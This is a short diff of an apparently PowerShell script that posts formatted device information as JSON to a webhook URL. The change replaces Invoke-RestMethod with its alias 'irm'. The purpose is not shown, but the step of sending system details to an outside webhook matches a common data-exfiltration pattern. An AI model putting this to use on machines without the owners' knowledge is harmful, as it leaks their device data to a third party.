@@ -52,5 +52,5 @@ $deviceInfoMessage = @{
     content = $deviceInfoFormatted
 }
 $jsonMessage = $deviceInfoMessage | ConvertTo-Json
-$response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonMessage -ContentType "application/json"
+$response = irm -Uri $webhookUrl -Method Post -Body $jsonMessage -ContentType "application/json"
 $response
